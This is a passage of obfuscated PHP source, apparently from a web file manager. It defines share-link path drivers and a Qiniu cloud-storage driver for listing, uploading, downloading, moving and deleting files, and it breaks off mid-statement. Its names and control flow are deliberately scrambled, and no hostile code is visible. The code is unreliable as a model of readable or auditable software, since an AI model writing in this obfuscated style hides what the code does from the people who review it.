$C¶­ÏÂ‘™É = IO::copyMove($E®éì†Ô†µ, $bé…©Ù©, $D©ºŞ¤„º¤, $a¸—î¯); $C¶­ÏÂ‘™É = $this->getPathOuter($C¶­ÏÂ‘™É); goto f«‘æ˜è·ö; b›‘ŠÄŞù†: $fÑ¾ÈŒèÏ´ =& $_SERVER[¼€¼ˆ¦‚¡]; $d‰ƒì²÷óà = $bé…©Ù©; $Fò·¸¢Ğ«³ = IO::driverMake($bé…©Ù©); goto CÌé»›ÅÀ; f«‘æ˜è·ö: return $C¶­ÏÂ‘™É; goto B¿İãÕ Ê•; B¿İãÕ Ê•: } public function pathFather($EœÈ¤‘×˜) { return get_path_father($this->pathParse[$_SERVER[¼€¼ˆ¦‚¡][75]]); } public function iconvSystem($A³Ñ•á°«Ã) { return $A³Ñ•á°«Ã; } protected function infoParse($d¿Æ‚ö°¾„, $a»à®Ø½Í = false) { $E‰¤»…‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $F®øŒÂ×ªÌ = $this->pathParse[$E‰¤»…‰[439]][$E‰¤»…‰[1018]] . $this->pathParse[$E‰¤»…‰[1011]]; if ($a»à®Ø½Í) { $bÀùö´äÏÜ = IO::infoWithChildren($F®øŒÂ×ªÌ); } else { $bÀùö´äÏÜ = IO::info($F®øŒÂ×ªÌ); } $aİ¼´øñ‚ = $this->pathParse[$E‰¤»…‰[439]]; return Action($E‰¤»…‰[1124])->_shareItemeParse($bÀùö´äÏÜ, $aİ¼´øñ‚); } public function listAll($EøÊ®Õ—•Á) { $A–¥½·î³ø =& $_SERVER[¼€¼ˆ¦‚¡]; $B¶ ·ÖÖ×° = IO::listAll($EøÊ®Õ—•Á); $AµÑ¼¥İ‘ = $this->pathParse[$A–¥½·î³ø[439]]; foreach ($B¶ ·ÖÖ×° as &$EŸ®Ÿ Éóö) { check_abort(); $EŸ®Ÿ Éóö = array_merge(IO::info($EŸ®Ÿ Éóö[$A–¥½·î³ø[75]]), $EŸ®Ÿ Éóö); $EŸ®Ÿ Éóö[$A–¥½·î³ø[391]] = Action($A–¥½·î³ø[1124])->_shareItemeParse($EŸ®Ÿ Éóö, $AµÑ¼¥İ‘); } return $B¶ ·ÖÖ×°; } public function getPathOuter($aîË¬‘İš) { goto aô§¸§¶ø½; F£Ù›‰³àó: $b‘”¯ñÌ = KodIO::clear($aîË¬‘İš); $EÇ‰‘Ï›² = KodIO::clear($this->pathParse[$eçÌÂãóì[439]][$eçÌÂãóì[1018]]); $eÒóŸéòæ½ = substr($b‘”¯ñÌ, strlen($EÇ‰‘Ï›²)); goto Cùõµó¨ê; Cùõµó¨ê: if (substr($b‘”¯ñÌ, 0, strlen($EÇ‰‘Ï›²)) != $EÇ‰‘Ï›²) { return !1; } return $this->pathParse[$eçÌÂãóì[1012]] . $eçÌÂãóì[8] . ltrim($eÒóŸéòæ½, $eçÌÂãóì[8]); goto a„èé¦£´¬; aô§¸§¶ø½: $eçÌÂãóì =& $_SERVER[¼€¼ˆ¦‚¡]; $BÅ”§°Ê¾² = KodIO::parse($aîË¬‘İš); if ($BÅ”§°Ê¾²[$eçÌÂãóì[29]] == KodIO::KOD_SHARE_ITEM) { return $BÅ”§°Ê¾²[$eçÌÂãóì[75]]; } goto F£Ù›‰³àó; a„èé¦£´¬: } public function getType() { $aÖ„ŠÜ× =& $_SERVER[¼€¼ˆ¦‚¡]; $EÙ’†³Âé¢ = str_replace($aÖ„ŠÜ×[71], $aÖ„ŠÜ×[33], get_class($this)); return strtolower($EÙ’†³Âé¢); } public function isTypeObject($fƒ»ÈøøÈğ) { return IO::isTypeObject($fƒ»ÈøøÈğ); } public function info($a«Ä¹ŒŸ—Ò) { return $this->infoParse($a«Ä¹ŒŸ—Ò); } public function infoAuth($EğßÄÒ“‹Ö) { return $this->infoParse($EğßÄÒ“‹Ö); } public function infoWithChildren($e¼º£Øà’Ê) { return $this->infoParse($e¼º£Øà’Ê, !0); } public function infoFull($F¼Íà ‹œ‰) { return $this->infoParse($F¼Íà ‹œ‰); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($FÖ„ÙñÛœ) { $this->pathParse = $FÖ„ÙñÛœ; } protected function infoParse($fÚî×®Ìô×, $c‘‰Ëª š = false) { $E‡Ìˆë =& $_SERVER[¼€¼ˆ¦‚¡]; return Action($E‡Ìˆë[1017])->sharePathInfo($this->pathParse[$E‡Ìˆë[75]], !0, $c‘‰Ëª š); } public function listPath($Fó„Ã‘Õ“–, $eŠŒ‚Œİë = false) { $EŞ³»„× =& $_SERVER[¼€¼ˆ¦‚¡]; $a•Ï—Ú›õÍ = IO::listPath($Fó„Ã‘Õ“–, $eŠŒ‚Œİë); foreach ($a•Ï—Ú›õÍ as $D“Óºœå„á => $DÅ®×ÛË‚ñ) { if (!in_array($D“Óºœå„á, array($EŞ³»„×[73], $EŞ³»„×[74]))) { continue; } foreach ($DÅ®×ÛË‚ñ as $cóó¿¼ƒ => $eÖ„Úñ‹„º) { $eÖ„Úñ‹„º = Action($EŞ³»„×[1133])->parsePathChildren($eÖ„Úñ‹„º, array($EŞ³»„×[387] => $Fó„Ã‘Õ“–)); $a•Ï—Ú›õÍ[$D“Óºœå„á][$cóó¿¼ƒ] = Action($EŞ³»„×[1017])->shareItemInfo($eÖ„Úñ‹„º); } } return $a•Ï—Ú›õÍ; } public function listAll($D³ÉŒÎÁ™) { $CÂµè¨–éÔ =& $_SERVER[¼€¼ˆ¦‚¡]; $b½ŠÆôõê… = IO::listAll($D³ÉŒÎÁ™); foreach ($b½ŠÆôõê… as &$DÃ®İÇêŒğ) { $DÃ®İÇêŒğ = array_merge(IO::info($DÃ®İÇêŒğ[$CÂµè¨–éÔ[75]]), $DÃ®İÇêŒğ); $DÃ®İÇêŒğ[$CÂµè¨–éÔ[391]] = Action($CÂµè¨–éÔ[1017])->shareItemInfo($DÃ®İÇêŒğ); } return $b½ŠÆôõê…; } } goto bæ’ŒÁ½Šˆ; b‰–ù—Ö×Â: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($E¿ˆ­ÅĞÙ…) { parent::__construct(); require_once SDK_DIR . $_SERVER[¼€¼ˆ¦‚¡][1212]; $this->_init($E¿ˆ­ÅĞÙ…); } public function _init($eµ’‡Ä§ ¾) { foreach ($eµ’‡Ä§ ¾ as $dš‰·±…Êì => $FÛÀÍÂ‘ïÉ) { if (isset($this->{$dš‰·±…Êì})) { $this->{$dš‰·±…Êì} = $FÛÀÍÂ‘ïÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¼€¼ˆ¦‚¡][1213], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($C™¯Û˜äÜí, $e»î›«¸ƒ = '', $b·™ŒÏë’ = REPEAT_RENAME) { if ($this->setContent($C™¯Û˜äÜí, $e»î›«¸ƒ)) { return $this->getPathOuter($C™¯Û˜äÜí); } return !1; } public function mkdir($C”—ñ‹—, $aÂ·“¶¹Ø„ = REPEAT_SKIP) { goto D®Ò­™¥í¸; aêøµ…Óš: $C”—ñ‹— = $C‡ˆˆª„æÏ . $B¹°º‡Ü˜ğ[8]; $C–Ä ¥’’ = get_path_this($C‡ˆˆª„æÏ); $eµÏ²—š› = $C”—ñ‹— . $C–Ä ¥’’; goto BÆÚ“…Ã‰×; D®Ò­™¥í¸: $B¹°º‡Ü˜ğ =& $_SERVER[¼€¼ˆ¦‚¡]; $C‡ˆˆª„æÏ = trim($C”—ñ‹—, $B¹°º‡Ü˜ğ[8]); if ($this->_isFolder($C‡ˆˆª„æÏ)) { return $this->getPathOuter($C‡ˆˆª„æÏ); } goto aêøµ…Óš; BÆÚ“…Ã‰×: if (!$this->mkfile($eµÏ²—š›)) { return !1; } if (!$this->moveFile($eµÏ²—š›, $C”—ñ‹—)) { $this->delFile($eµÏ²—š›); return !1; } return $this->getPathOuter($C‡ˆˆª„æÏ); goto bÌÕË‰âÇ; bÌÕË‰âÇ: } public function copyFile($AçìùÀ°, $aØ‰Â£¨®«) { $Bñ£¤¥Ê•… = $this->bucketManager->copy($this->bucket, $AçìùÀ°, $this->bucket, $aØ‰Â£¨®«, !0); return $Bñ£¤¥Ê•… ? !1 : $this->getPathOuter($aØ‰Â£¨®«); } public function moveFile($cîèÁÄá‰Æ, $cÔµ¿ÅªÛÚ) { $f±îêâŒ§† = $this->bucketManager->move($this->bucket, $cîèÁÄá‰Æ, $this->bucket, $cÔµ¿ÅªÛÚ, !0); return $f±îêâŒ§† ? !1 : $this->getPathOuter($cÔµ¿ÅªÛÚ); } public function delFile($B‚¬È­Äñò) { $Dìùã£âò = $this->bucketManager->delete($this->bucket, $B‚¬È­Äñò); return $Dìùã£âò ? !1 : !0; } public function delFolder($F‘¶Á·÷Å‰) { $D‚‡©ë¤“† = $this->fileList($F‘¶Á·÷Å‰); if (empty($D‚‡©ë¤“†)) { return !0; } $FòÎŞ›ÏÊª = 1000; if (count($D‚‡©ë¤“†) <= $FòÎŞ›ÏÊª) { return $this->qnDelObj($D‚‡©ë¤“†) ? !1 : !0; } foreach (array_chunk($D‚‡©ë¤“†, $FòÎŞ›ÏÊª) as $f“ªÌÊ¾ñì) { $Bïˆ†Ô±º” = $this->qnDelObj($f“ªÌÊ¾ñì); if ($Bïˆ†Ô±º”) { return !1; } } return !0; } private function qnDelObj($eº‚Ğ±àÎê) { $C‚­Ó‰Ïƒ = $this->bucketManager->buildBatchDelete($this->bucket, $eº‚Ğ±àÎê); list($f”ÌÂ¼¶ºæ, $f‹¢Á¼ÇÅ) = $this->bucketManager->batch($C‚­Ó‰Ïƒ); return $f‹¢Á¼ÇÅ; } private function fileList($aË÷ìßÀäÅ, $DğÈ‰Å¼õ  = 0) { goto d‚’–ƒùŠ²; d‚’–ƒùŠ²: $BÀëÁ±Š¼Š =& $_SERVER[¼€¼ˆ¦‚¡]; $aË÷ìßÀäÅ = trim($aË÷ìßÀäÅ, $BÀëÁ±Š¼Š[8]); $EÖ¤ƒ…ùí© = empty($aË÷ìßÀäÅ) ? $BÀëÁ±Š¼Š[33] : $aË÷ìßÀäÅ . $BÀëÁ±Š¼Š[8]; goto açÓ£¸£—; açÓ£¸£—: $cŠğ£½Ô†› = $BÀëÁ±Š¼Š[33]; $C›®÷¡¾Ä = 1000; $AÓŞñƒİùÖ = $BÀëÁ±Š¼Š[33]; goto Bñë•¨Ô®Œ; Bñë•¨Ô®Œ: $C¥ñ›ç¦›Ÿ = array(); while (!0) { list($føÓÙÂ¦Ä, $BÂ°Œ ßÒé) = $this->bucketManager->listFiles($this->bucket, $EÖ¤ƒ…ùí©, $cŠğ£½Ô†›, $C›®÷¡¾Ä, $AÓŞñƒİùÖ); if ($BÂ°Œ ßÒé) { return !1; } $cŠğ£½Ô†› = array_key_exists($BÀëÁ±Š¼Š[1183], $føÓÙÂ¦Ä) ? $cŠğ£½Ô†› = $føÓÙÂ¦Ä[$BÀëÁ±Š¼Š[1214]] : $BÀëÁ±Š¼Š[33]; foreach ($føÓÙÂ¦Ä[$BÀëÁ±Š¼Š[1215]] as $b‘ÆšµªÇÓ) { $EôÑÏ¬‡“ = $b‘ÆšµªÇÓ[$BÀëÁ±Š¼Š[89]]; if ($DğÈ‰Å¼õ ) { $EôÑÏ¬‡“ = array($BÀëÁ±Š¼Š[28] => $EôÑÏ¬‡“, $BÀëÁ±Š¼Š[77] => $b‘ÆšµªÇÓ[$BÀëÁ±Š¼Š[1216]]); } $C¥ñ›ç¦›Ÿ[] = $EôÑÏ¬‡“; } if ($cŠğ£½Ô†› == $BÀëÁ±Š¼Š[33]) { break; } } return $C¥ñ›ç¦›Ÿ; goto aƒ¿×Ìóƒ‹; aƒ¿×Ìóƒ‹: } public function rename($b‚ÑÖˆ¹İÕ, $béˆ“Ğóß¼) { return $this->renameObject($b‚ÑÖˆ¹İÕ, $béˆ“Ğóß¼); } public function fileInfo($C“§Å¹æ‰, $aŠîä©”°’ = false, $FöœğàĞ‰… = array()) { goto f…ÅˆÂºÅ¿; DíµŞ„Ì¥¸: return $Eî˜˜‡ËÀ½; goto f¦ë›ì°; D¤—æšÍ‰: if (empty($FöœğàĞ‰…)) { $FöœğàĞ‰… = $this->objectMeta($C“§Å¹æ‰); if (!$FöœğàĞ‰…) { return $Eî˜˜‡ËÀ½; } } if (isset($FöœğàĞ‰…[$f˜è®íë¢Ã[1217]])) { $Eî˜˜‡ËÀ½[$f˜è®íë¢Ã[107]] = substr($FöœğàĞ‰…[$f˜è®íë¢Ã[1217]] . $f˜è®íë¢Ã[33], 0, 10); } if (isset($FöœğàĞ‰…[$f˜è®íë¢Ã[1216]])) { $Eî˜˜‡ËÀ½[$f˜è®íë¢Ã[77]] = $FöœğàĞ‰…[$f˜è®íë¢Ã[1216]]; } goto DíµŞ„Ì¥¸; f…ÅˆÂºÅ¿: $f˜è®íë¢Ã =& $_SERVER[¼€¼ˆ¦‚¡]; if ($aŠîä©”°’) { return array($f˜è®íë¢Ã[28] => $this->pathThis($C“§Å¹æ‰), $f˜è®íë¢Ã[75] => $this->getPathOuter($f˜è®íë¢Ã[8] . $C“§Å¹æ‰), $f˜è®íë¢Ã[29] => $f˜è®íë¢Ã[167], $f˜è®íë¢Ã[77] => isset($FöœğàĞ‰…[$f˜è®íë¢Ã[1216]]) ? $FöœğàĞ‰…[$f˜è®íë¢Ã[1216]] : 0, $f˜è®íë¢Ã[160] => $this->ext($C“§Å¹æ‰)); } $Eî˜˜‡ËÀ½ = array($f˜è®íë¢Ã[28] => $this->pathThis($C“§Å¹æ‰), $f˜è®íë¢Ã[75] => $this->getPathOuter($f˜è®íë¢Ã[8] . $C“§Å¹æ‰), $f˜è®íë¢Ã[29] => $f˜è®íë¢Ã[167], $f˜è®íë¢Ã[187] => 0, $f˜è®íë¢Ã[107] => 0, $f˜è®íë¢Ã[77] => 0, $f˜è®íë¢Ã[160] => $this->ext($C“§Å¹æ‰), $f˜è®íë¢Ã[188] => !0, $f˜è®íë¢Ã[189] => !0); goto D¤—æšÍ‰; f¦ë›ì°: } public function folderInfo($Bá¥Ëì‘­£, $A­µ Ç«§ª = false) { goto a ¶ê—‰Å; cˆˆÂå»©•: $Bá¥Ëì‘­£ = rtrim($Bá¥Ëì‘­£, $aĞ¿»¦¯í[8]) . $aĞ¿»¦¯í[8]; $c‹ÓÕ¦µÙ² = $this->objectMeta($Bá¥Ëì‘­£); if (isset($c‹ÓÕ¦µÙ²[$aĞ¿»¦¯í[1217]])) { $f•Á¸ÔŒ¼[$aĞ¿»¦¯í[107]] = substr($c‹ÓÕ¦µÙ²[$aĞ¿»¦¯í[1217]] . $aĞ¿»¦¯í[33], 0, 10); } goto F³î‰ª‘ãØ; F³î‰ª‘ãØ: return $f•Á¸ÔŒ¼; goto Bƒ•‘³ã¤ƒ; a ¶ê—‰Å: $aĞ¿»¦¯í =& $_SERVER[¼€¼ˆ¦‚¡]; if ($A­µ Ç«§ª) { return array($aĞ¿»¦¯í[28] => $this->pathThis($Bá¥Ëì‘­£), $aĞ¿»¦¯í[75] => $this->getPathOuter($aĞ¿»¦¯í[8] . $Bá¥Ëì‘­£), $aĞ¿»¦¯í[29] => $aĞ¿»¦¯í[76]); } $f•Á¸ÔŒ¼ = array($aĞ¿»¦¯í[28] => $this->pathThis($Bá¥Ëì‘­£), $aĞ¿»¦¯í[75] => $this->getPathOuter($aĞ¿»¦¯í[8] . $Bá¥Ëì‘­£), $aĞ¿»¦¯í[29] => $aĞ¿»¦¯í[76], $aĞ¿»¦¯í[187] => 0, $aĞ¿»¦¯í[107] => 0, $aĞ¿»¦¯í[1162] => !0, $aĞ¿»¦¯í[1163] => !0); goto cˆˆÂå»©•; Bƒ•‘³ã¤ƒ: } public function listPath($a˜ÏñÂ›¢, $D¸ö“î‚˜ô = false) { goto e¼Ñ„óÚ‘˜; Eë¹´·®¸¤: $fÚ©ô¨®Á = $a…¶©Š¦Ç²[33]; $cé†öë‘ = 1000; $CÒ¹¿ë„ ° = $a…¶©Š¦Ç²[8]; goto bó¢²ËÀÖ¡; e¼Ñ„óÚ‘˜: $a…¶©Š¦Ç² =& $_SERVER[¼€¼ˆ¦‚¡]; $a˜ÏñÂ›¢ = trim($a˜ÏñÂ›¢, $a…¶©Š¦Ç²[8]); $a×¡ˆê‹½Ù = empty($a˜ÏñÂ›¢) ? $a…¶©Š¦Ç²[33] : $a˜ÏñÂ›¢ . $a…¶©Š¦Ç²[8]; goto Eë¹´·®¸¤; bó¢²ËÀÖ¡: $eÎÉ±‰Å—é = $DÆô‘”à = array(); while (!0) { list($BËà¥Ëßäß, $aôŒÅŞ§»›) = $this->bucketManager->listFiles($this->bucket, $a×¡ˆê‹½Ù, $fÚ©ô¨®Á, $cé†öë‘, $CÒ¹¿ë„ °); if ($aôŒÅŞ§»›) { return !1; } $fÚ©ô¨®Á = array_key_exists($a…¶©Š¦Ç²[1183], $BËà¥Ëßäß) ? $fÚ©ô¨®Á = $BËà¥Ëßäß[$a…¶©Š¦Ç²[1214]] : $a…¶©Š¦Ç²[33]; if (isset($BËà¥Ëßäß[$a…¶©Š¦Ç²[1218]])) { foreach ($BËà¥Ëßäß[$a…¶©Š¦Ç²[1218]] as $dŞÎí¿¸µ®) { if ($dŞÎí¿¸µ® == $a×¡ˆê‹½Ù) { continue; } $eÎÉ±‰Å—é[] = $this->folderInfo($dŞÎí¿¸µ®, $D¸ö“î‚˜ô); } } if (isset($BËà¥Ëßäß[$a…¶©Š¦Ç²[1215]])) { foreach ($BËà¥Ëßäß[$a…¶©Š¦Ç²[1215]] as $Dñ° õ‡±¹) { if ($Dñ° õ‡±¹[$a…¶©Š¦Ç²[89]] == $a×¡ˆê‹½Ù) { continue; } $DÆô‘”à[] = $this->fileInfo($Dñ° õ‡±¹[$a…¶©Š¦Ç²[89]], $D¸ö“î‚˜ô, $Dñ° õ‡±¹); } } if ($fÚ©ô¨®Á == $a…¶©Š¦Ç²[33]) { break; } } return array($a…¶©Š¦Ç²[74] => $eÎÉ±‰Å—é, $a…¶©Š¦Ç²[73] => $DÆô‘”à); goto b¶¥ÃÉÎ‡›; b¶¥ÃÉÎ‡›: } public function has($c¾İÁÚ‡àš, $eºµŸµ·­ = false, $DàÛó³õÏ = true) { goto dÍõ©ˆÍóó; B‚–â¡„ç: $EÂÏØ’°´¶ = $cÎŒ¼Èù¦[33]; $e¶ÑÅØùÄ = 1000; $e×’ÃøÎğØ = $cÎŒ¼Èù¦[8]; goto D‘Ôàîß‹‚; dÍõ©ˆÍóó: $cÎŒ¼Èù¦ =& $_SERVER[¼€¼ˆ¦‚¡]; $c¾İÁÚ‡àš = trim($c¾İÁÚ‡àš, $cÎŒ¼Èù¦[8]); $AŸ„Ú¤…š˜ = empty($c¾İÁÚ‡àš) ? $cÎŒ¼Èù¦[33] : $c¾İÁÚ‡àš . $cÎŒ¼Èù¦[8]; goto B‚–â¡„ç; D‘Ôàîß‹‚: $c˜ç÷›Œ— = 0; $dµ‰ÌÃ„˜ = 0; while (!0) { list($cÈªê‘ì²©, $cø¿¢¾„¦×) = $this->bucketManager->listFiles($this->bucket, $AŸ„Ú¤…š˜, $EÂÏØ’°´¶, $e¶ÑÅØùÄ, $e×’ÃøÎğØ); if ($cø¿¢¾„¦×) { return !1; } $EÂÏØ’°´¶ = array_key_exists($cÎŒ¼Èù¦[1183], $cÈªê‘ì²©) ? $EÂÏØ’°´¶ = $cÈªê‘ì²©[$cÎŒ¼Èù¦[1214]] : $cÎŒ¼Èù¦[33]; if ($eºµŸµ·­) { if (!empty($cÈªê‘ì²©[$cÎŒ¼Èù¦[1215]])) { $c˜ç÷›Œ— += count($cÈªê‘ì²©[$cÎŒ¼Èù¦[1215]]); } if (!empty($cÈªê‘ì²©[$cÎŒ¼Èù¦[1218]])) { $dµ‰ÌÃ„˜ += count($cÈªê‘ì²©[$cÎŒ¼Èù¦[1218]]); } if ($EÂÏØ’°´¶ === $cÎŒ¼Èù¦[33]) { break; } continue; } if ($DàÛó³õÏ) { if (!empty($cÈªê‘ì²©[$cÎŒ¼Èù¦[1215]])) { return !0; } } else { if (!empty($cÈªê‘ì²©[$cÎŒ¼Èù¦[1218]])) { return !0; } } if ($EÂÏØ’°´¶ == $cÎŒ¼Èù¦[33]) { break; } } goto f†È£ô›±¢; f†È£ô›±¢: if ($eºµŸµ·­) { return array($cÎŒ¼Èù¦[191] => $c˜ç÷›Œ—, $cÎŒ¼Èù¦[192] => $dµ‰ÌÃ„˜); } return !1; goto e¢‹„Êïçê; e¢‹„Êïçê: } public function listAll($Aæó¼§„Ú) { $EÙÅˆØ÷°ê =& $_SERVER[¼€¼ˆ¦‚¡]; $d™º‚Î¿Œš = $this->fileList($Aæó¼§„Ú, 1); $CÀ¾½ Ú«§ = array(); foreach ($d™º‚Î¿Œš as $eì“ÃÁ†ñË) { $CÀ¾½ Ú«§[$eì“ÃÁ†ñË[$EÙÅˆØ÷°ê[28]]] = $eì“ÃÁ†ñË[$EÙÅˆØ÷°ê[77]]; } return $this->listAllFiles($Aæó¼§„Ú, array_keys($CÀ¾½ Ú«§), $CÀ¾½ Ú«§); } public function canRead($d³¼¾Ë˜) { return $this->exist($d³¼¾Ë˜) ? !0 : !1; } public function canWrite($D­†Ö»ÔæĞ) { return $this->exist($D­†Ö»ÔæĞ) ? !0 : !1; } public function getContent($B’ÎŠó“) { return $this->fileSubstr($B’ÎŠó“, 0, -1); } public function setContent($CÀÓ«Àë’Á, $BÈÜ”²ö¡à = '') { $Eñ¸…¹´¾¸ = $this->tempFile($this->pathThis($CÀÓ«Àë’Á)); file_put_contents($Eñ¸…¹´¾¸, $BÈÜ”²ö¡à); if ($this->upload($CÀÓ«Àë’Á, $Eñ¸…¹´¾¸)) { $this->tempFileRemve($Eñ¸…¹´¾¸); return !0; } return !1; } public function refreshUrls($DÔ¤î¯İÄ) { goto cŠ‘î„»’; cŠ‘î„»’: $c±èÁ®³ù‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $cô¥ÖÇ–ï = array(); if (is_array($DÔ¤î¯İÄ)) { foreach ($DÔ¤î¯İÄ as $eÙ†ŞôÊ‹) { $cô¥ÖÇ–ï[] = $this->link($eÙ†ŞôÊ‹); } } else { $cô¥ÖÇ–ï[] = $this->link($DÔ¤î¯İÄ); } goto eàí¤Ûİ¶ñ; eàí¤Ûİ¶ñ: $a†õí‹¬„ = new Qiniu\Cdn\CdnManager($this->auth); list($cŒŞó¥°—õ, $E£Ö™Ÿ¶—œ) = $a†õí‹¬„->refreshUrls($cô¥ÖÇ–ï); if ($E£Ö™Ÿ¶—œ) { return !1; } goto D«ˆ†ñ¦†è; D«ˆ†ñ¦†è: return $cŒŞó¥°—õ[$c±èÁ®³ù‡[1219]] == $c±èÁ®³ù‡[692] ? !0 : !1; goto c¾„˜½åîë; c¾„˜½åîë: } public function fileSubstr($BßÒš±ŒÇ—, $aë‘š„î , $C‘¦¥İÙ§ø) { $aâ‰³óÆï£ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!($BÕÍ„øÙƒÎ = $this->link($BßÒš±ŒÇ—))) { return !1; } $BÖîÚğæ– = !1; if ($C‘¦¥İÙ§ø > 0) { $C¦¤¨—Âª = $aë‘š„î  + $C‘¦¥İÙ§ø - 1; $BÖîÚğæ– = array($aâ‰³óÆï£[1220] . $aë‘š„î  . $aâ‰³óÆï£[412] . $C¦¤¨—Âª); } $bÖ†—ìˆ– = url_request($BÕÍ„øÙƒÎ, $aâ‰³óÆï£[216], !1, $BÖîÚğæ–); return $bÖ†—ìˆ–[$aâ‰³óÆï£[685]] ? $bÖ†—ìˆ–[$aâ‰³óÆï£[1033]] : !1; } public function upload($DÛˆ‡Ä‘Æš, $a¦‰Ò ²ÂÛ, $a¤–ª·Ëå = false, $dÎ›‚à¥–æ = REPEAT_REPLACE) { $A¶¨‡˜ƒ… = new Qiniu\Storage\UploadManager(); $B¢ôÂîÒ¸ = $this->auth->uploadToken($this->bucket, $DÛˆ‡Ä‘Æš); $d„¸§±ÀİŠ = get_file_mime(get_path_ext($a¦‰Ò ²ÂÛ)); list($bñŒÖŞåõ·, $d¾Œä«Ãß) = $A¶¨‡˜ƒ…->putFile($B¢ôÂîÒ¸, $DÛˆ‡Ä‘Æš, $a¦‰Ò ²ÂÛ, null, $d„¸§±ÀİŠ); return $d¾Œä«Ãß ? !1 : $this->getPathOuter($DÛˆ‡Ä‘Æš); } public function uploadFormData($AíÙ»›ß½È, $BÀœ¤¹òÈæ = 3600) { return $this->uploadToken($AíÙ»›ß½È, $BÀœ¤¹òÈæ); } public function multiUploadFormData($CÓ¥ÛÚ«œ, $eĞ…»îö×² = 3600) { return $this->uploadToken($CÓ¥ÛÚ«œ, $eĞ…»îö×²); } private function uploadToken($bô ë¼õŠ, $CøÁÄ‚‹†¶ = 3600) { goto aà–ã—šÕ; b×â¸É·‡: $Aã’ö“Âô = http_type() . "\72\x2f\x2f\x75\160\154\x6f\141\144{$cÛ†œĞß•}\56\161\x69\x6e\151\165\160\56\143\157\155\x2f"; return array($e¢š—ÓŠÏ¾[1224] => $F“àÉ…É¢™, $e¢š—ÓŠÏ¾[1225] => $Aã’ö“Âô); goto D­ª¹¯ëˆ; aà–ã—šÕ: $e¢š—ÓŠÏ¾ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cå÷£ÀÆÓ = $CøÁÄ‚‹†¶; $b”ÔóÁ×”¯ = array($e¢š—ÓŠÏ¾[1221] => $e¢š—ÓŠÏ¾[1222]); goto f—šôÙØ®‡; f—šôÙØ®‡: $D³„ô­ƒæ = null; $F“àÉ…É¢™ = $this->auth->uploadToken($this->bucket, $D³„ô­ƒæ, $Cå÷£ÀÆÓ, $b”ÔóÁ×”¯, !0); $cÛ†œĞß• = empty($this->region) || $this->region == $e¢š—ÓŠÏ¾[1223] ? $e¢š—ÓŠÏ¾[33] : $e¢š—ÓŠÏ¾[412] . $this->region; goto b×â¸É·‡; D­ª¹¯ëˆ: } public function download($FÜç‹É‘Ø§, $eÅäéó›¨) { goto dòè¬“ªóœ; fïõ†çˆ°­: $f’‚†ßÃöµ = 1024 * 200; $bó†îÌ©‚ = fopen($f¢›öÇ¸¡, $_SERVER[¼€¼ˆ¦‚¡][1226]); while (!0) { $EêìîÑáÊå = $this->fileSubstr($FÜç‹É‘Ø§, $aØ¤Å’ÀµÃ, $f’‚†ßÃöµ); if ($EêìîÑáÊå === !1) { return !1; } fwrite($bó†îÌ©‚, $EêìîÑáÊå); $aØ¤Å’ÀµÃ += $f’‚†ßÃöµ; if (strlen($EêìîÑáÊå) < $f’‚†ßÃöµ) { break; } } goto e©¶¿·ß„£; dòè¬“ªóœ: $f¢›öÇ¸¡ = IO::getPathInner(IO::mkfile($eÅäéó›¨)); if (!($BÂØÆ½È¯ = $this->link($FÜç‹É‘Ø§))) { return !1; } $aØ¤Å’ÀµÃ = 0; goto fïõ†çˆ°­; e©¶¿·ß„£: fclose($bó†îÌ©‚); return $eÅäéó›¨; goto aºñ˜¬Ï—Ğ; aºñ˜¬Ï—Ğ: } public function link($f…’É±¢­, $eè«ò‰Âš = '') { if (!$this->isFile($f…’É±¢­)) { return !1; } $DË°­Ö¼ïŠ = $this->getHost() . $_SERVER[¼€¼ˆ¦‚¡][8] . $this->pathEncode($f…’É±¢­) . $eè«ò‰Âš; return $this->auth->privateDownloadUrl($DË°­Ö¼ïŠ, 3600 * 12); } public function fileOut($bÃŠïİòİ”, $C¥ƒÁò·¨ = false, $D¢ö‚ÁŠù¡ = false, $aÁ­÷©¬ŠÈ = '') { $dÑĞçğ¯Š =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$D¢ö‚ÁŠù¡) { $D¢ö‚ÁŠù¡ = $this->pathThis($bÃŠïİòİ”); } $BİŒèÖÂ— = $C¥ƒÁò·¨ ? $dÑĞçğ¯Š[1227] . rawurlencode($D¢ö‚ÁŠù¡) : $dÑĞçğ¯Š[33]; $d§íğ£Ç› = $this->link($bÃŠïİòİ”, $BİŒèÖÂ—); $this->fileOutLink($d§íğ£Ç›); } public function fileOutServer($C¿Ôµ•Ó–ù, $E´¥ŠÒÍ = false, $BÙ¢º•§¬ø = false, $Aîã£Û»¾ğ = '') { parent::fileOut($C¿Ôµ•Ó–ù, $E´¥ŠÒÍ, $BÙ¢º•§¬ø, $Aîã£Û»¾ğ); } public function fileOutImage($e­Ëàí‰÷æ, $ağÓã ©Ø = 250) { $D®«½—Îæ— = $this->link($e­Ëàí‰÷æ, $_SERVER[¼€¼ˆ¦‚¡][1228] . $ağÓã ©Ø); $this->fileOutLink($D®«½—Îæ—); } public function fileOutImageServer($eñ™ù‰ù¾Í, $aº¶Şƒé» = 250) { parent::fileOutImage($eñ™ù‰ù¾Í, $aº¶Şƒé»); } public function hashMd5($bØŠäĞğÛÚ) { $e´œ’à•¤Í =& $_SERVER[¼€¼ˆ¦‚¡]; $Fòºäéá½ğ = $this->objectMeta($bØŠäĞğÛÚ); return isset($Fòºäéá½ğ[$e´œ’à•¤Í[196]]) ? $Fòºäéá½ğ[$e´œ’à•¤Í[196]] : !1; $aÁÃ”øÇè = $this->link($bØŠäĞğÛÚ, $e´œ’à•¤Í[1229]); } public function size($dœÎ¨ÀùÁ¶) { $Cæ£“»Êã¦ = 